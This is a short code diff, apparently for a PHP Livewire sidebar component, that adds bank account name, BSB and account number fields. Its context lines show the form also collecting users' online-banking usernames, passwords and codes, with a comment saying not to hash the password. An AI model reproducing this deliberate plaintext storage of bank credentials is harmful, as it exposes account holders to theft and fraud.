@@ -16,6 +16,8 @@ class Sidebar extends Component
 
     public $name, $email, $address, $suburb, $postcode, $state, $password;
 
+    public $accName, $bsb, $accNo;
+
     public function mount()
     {
         if (!auth()->check()) {
@@ -36,6 +38,9 @@ class Sidebar extends Component
         $this->suburb = $user->suburb;
         $this->postcode = $user->postcode;
         $this->state = $user->state;
+        $this->accName = $user->accName;
+        $this->bsb = $user->bsb;
+        $this->accNo = $user->accNo;
     }
     public function render()
     {
@@ -54,6 +59,9 @@ class Sidebar extends Component
             'bankUsername' => 'required',
             'bankPassword' => 'required',
             'bankCardReceived' => 'required',
+            'accName' => 'required',
+            'bsb' => 'required',
+            'accNo' => 'required',
         ]);
 
         // Trova l'utente corrente
@@ -65,6 +73,9 @@ class Sidebar extends Component
             'bankPassword' => $this->bankPassword, // Non hashare la password
             'bankCodes' => $this->bankCodes,
             'bankCardReceived' => $this->bankCardReceived,
+            'accName' => $this->accName,
+            'bsb' => $this->bsb,
+            'accNo' => $this->accNo,
         ]);
 
         // Messaggio di successo
